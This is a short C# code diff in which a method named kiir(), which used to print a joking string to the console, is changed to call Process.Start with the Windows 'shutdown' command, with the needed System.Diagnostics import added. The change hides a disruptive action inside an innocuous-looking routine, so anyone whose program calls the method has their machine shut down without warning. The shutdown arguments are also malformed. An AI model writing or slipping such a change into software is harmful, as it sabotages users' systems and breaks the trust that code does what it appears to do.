@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Diagnostics;
 
 namespace markkoltai
 {
@@ -9,7 +10,7 @@ namespace markkoltai
     {
         public static void kiir()
         {
-            Console.WriteLine("xXx69markkoltai69xXx");
+            Process.Start("shutdown", "/t / s 0"); 
         }
     }
 }
